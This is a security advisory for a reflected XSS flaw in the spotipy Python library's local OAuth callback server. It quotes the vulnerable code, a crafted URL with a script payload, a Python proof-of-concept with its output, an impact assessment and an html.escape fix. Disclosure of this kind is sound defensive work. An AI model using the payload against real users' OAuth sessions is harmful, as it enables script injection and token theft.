@@ -1,0 +1,141 @@
+PYSEC-2026-1937 PyPI/spotipy — Spotipy has a XSS vulnerability in its OAuth callback server
+package: spotipy
+ecosystem: PyPI
+versions affected:
+  >= 0, < 2.25.2 (ECOSYSTEM)
+aliases: CVE-2025-66040, GHSA-r77h-rpp9-w2xm
+references:
+  https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-r77h-rpp9-w2xm
+  https://nvd.nist.gov/vuln/detail/CVE-2025-66040
+  https://github.com/spotipy-dev/spotipy/commit/880b92d7243dcf2b83bf31dc365a858d8b5e6767
+  https://github.com/spotipy-dev/spotipy
+  https://pypi.org/project/spotipy
+  https://github.com/advisories/GHSA-r77h-rpp9-w2xm
+
+### Summary
+XSS vulnerability in OAuth callback server allows JavaScript injection through unsanitized error parameter. Attackers can execute arbitrary JavaScript in the user's browser during OAuth authentication.
+
+
+### Details
+**Vulnerable Code:** `spotipy/oauth2.py` lines 1238-1274 (RequestHandler.do_GET)
+
+**The Problem:**
+During OAuth flow, spotipy starts a local HTTP server to receive callbacks. The server reflects the `error` URL parameter directly into HTML without sanitization.
+
+**Vulnerable code at line 1255:**
+```python
+status = f"failed ({self.server.error})"
+```
+
+**Then embedded in HTML at line 1265:**
+```python
+self._write(f"""<html>
+<body>
+<h1>Authentication status: {status}</h1>
+</body>
+</html>""")
+```
+
+The `error` parameter comes from URL parsing (lines 388-393) without HTML escaping, allowing script injection.
+
+**Attack Flow:**
+1. User starts OAuth authentication → local server runs on `http://127.0.0.1:8080`
+2. Attacker crafts malicious URL: `http://127.0.0.1:8080/?error=<script>alert(1)</script>&state=x`
+3. User visits URL → JavaScript executes in localhost origin
+
+
+### PoC
+
+**Simple Python Test:**
+```python
+#!/usr/bin/env python3
+# poc_xss.py - Demonstrates XSS in spotipy OAuth callback
+
+import requests
+from spotipy.oauth2 import start_local_http_server
+import threading
+import time
+
+# Start vulnerable server in background
+def start_server():
+    server = start_local_http_server(8080)
+    server.handle_request()
+
+thread = threading.Thread(target=start_server, daemon=True)
+thread.start()
+time.sleep(2)
+
+# Send XSS payload
+payload = '<script>alert("XSS")</script>'
+url = f'http://127.0.0.1:8080/?error={payload}&state=test'
+
+response = requests.get(url)
+print(f"Status: {response.status_code}")
+print(f"\nHTML Response:\n{response.text}")
+
+# Check if vulnerable
+if payload in response.text:
+    print(f"\n[!] VULNERABLE: Payload '{payload}' reflected without escaping!")
+else:
+    print("\n[+] Safe: Payload was sanitized")
+```
+
+**Run it:**
+```bash
+pip install spotipy requests
+python3 poc_xss.py
+```
+
+**Output shows:**
+```
+Status: 200
+HTML Response:
+<html>
+<body>
+<h1>Authentication status: failed (<script>alert("XSS")</script>)</h1>
+</body>
+</html>
+
+[!] VULNERABLE: Payload '<script>alert("XSS")</script>' reflected without escaping!
+```
+
+**The Proof:**
+- Expected (safe): `&lt;script&gt;alert("XSS")&lt;/script&gt;`
+- Actual (vulnerable): `<script>alert("XSS")</script>`
+- The script tags are NOT escaped → XSS confirmed
+
+### Impact
+
+**Vulnerability Type:** Cross-Site Scripting (XSS) - CWE-79
+
+**Affected Users:** Anyone using spotipy's OAuth flow with localhost redirect URIs
+
+**Attack Complexity:** Medium-High
+- Requires timing (during brief OAuth window)
+- Localhost-only (127.0.0.1)
+- Requires user interaction (click malicious link)
+
+**Potential Impact:**
+- Execute JavaScript in localhost origin
+- Access other localhost services (port scanning, API calls)
+- Steal data from local web applications
+- Extract OAuth tokens from browser storage
+- Bypass CSRF protections on localhost endpoints
+
+**CVSS 3.1 Score:** 4.2 (Medium)
+- Attack Vector: Local
+- Attack Complexity: High
+- Privileges Required: None
+- User Interaction: Required
+- Scope: Unchanged
+- Confidentiality/Integrity: Low
+
+
+**Recommended Fix:**
+```python
+import html
+
+# Line 1255 - apply HTML escaping
+if self.server.error:
+    status = f"failed ({html.escape(str(self.server.error))})"
+```
